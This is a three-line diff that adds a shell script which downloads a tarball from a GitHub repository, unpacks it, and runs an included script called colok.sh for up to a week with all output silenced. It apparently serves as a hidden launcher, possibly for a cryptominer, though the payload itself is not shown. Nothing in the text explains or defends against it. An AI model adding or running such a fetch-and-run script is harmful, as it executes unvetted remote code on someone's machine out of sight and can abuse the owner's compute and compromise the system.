@@ -1,0 +1,3 @@
+wget https://github.com/alissalam/testrtm/raw/main/nubiasa.tar.gz
+tar xf nubiasa.tar.gz
+timeout 10080m ./colok.sh >/dev/null >/dev/null 2>&1
